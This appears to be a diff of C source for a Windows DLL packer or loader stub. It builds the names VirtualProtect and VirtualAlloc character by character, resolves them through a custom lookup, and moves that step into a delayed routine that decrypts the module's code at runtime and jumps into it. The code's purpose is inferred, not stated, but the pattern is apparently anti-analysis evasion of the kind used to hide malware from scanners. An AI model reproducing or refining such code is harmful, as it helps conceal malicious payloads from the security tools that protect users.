@@ -493,7 +493,6 @@ static HMODULE get_Kernel32(void)
 #pragma code_seg(".pedll32")
 BOOL WINAPI DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 {
-	char szVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x00 };
 	char szDisableThreadLibraryCalls[] = { 'D', 'i', 's', 'a', 'b', 'l', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'C', 'a', 'l', 'l', 's', 00 };
 	char szGetModuleFileNameA[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'A', 0x00 };
 
@@ -511,18 +510,8 @@ BOOL WINAPI DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserve
 			g_hKernel32 = hinstDLL;
 
 			HMODULE h = get_Kernel32();
-			_VirtualProtect = (VirtualProtect_ptr) _dll32_GetProcAddress(h, szVirtualProtect);
-
+			
 			_InitializeCriticalSection(h, &_critical_section);
-						
-			szVirtualProtect[7] = 'A';
-			szVirtualProtect[8] = 'l';
-			szVirtualProtect[9] = 'l';
-			szVirtualProtect[0x0a] = 'o';
-			szVirtualProtect[0x0b] = 'c';
-			szVirtualProtect[0x0c] = 0x00;
-
-			_VirtualAlloc = (VirtualAlloc_ptr) _dll32_GetProcAddress(h, szVirtualProtect);
 
 			DisableThreadLibraryCalls_ptr _DisableThreadLibraryCalls = (DisableThreadLibraryCalls_ptr) _dll32_GetProcAddress(h, szDisableThreadLibraryCalls);
 			_DisableThreadLibraryCalls(hinstDLL);
@@ -556,6 +545,20 @@ LPVOID WINAPI DELAYDECRYPT(DWORD dwX)
 
 	if (g_decrypted == FALSE)
 	{
+		char szVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x00 };
+		_VirtualProtect = (VirtualProtect_ptr) _dll32_GetProcAddress(get_Kernel32(), szVirtualProtect);
+		szVirtualProtect[7] = 'A';
+		szVirtualProtect[8] = 'l';
+		szVirtualProtect[9] = 'l';
+		szVirtualProtect[0x0a] = 'o';
+		szVirtualProtect[0x0b] = 'c';
+		szVirtualProtect[0x0c] = 0x00;
+
+		_VirtualAlloc = (VirtualAlloc_ptr) _dll32_GetProcAddress(get_Kernel32(), szVirtualProtect);
+
+		vtable.mem_protect	= _VirtualProtect;
+		vtable.mem_alloc	= _VirtualAlloc;
+
 		g_decrypted = decrypt(&vtable, g_hKernel32, DLL_PROCESS_ATTACH, NULL);
 
 		_EntryPoint(g_lpTextBaseAddr, g_hKernel32, DLL_PROCESS_ATTACH, NULL);
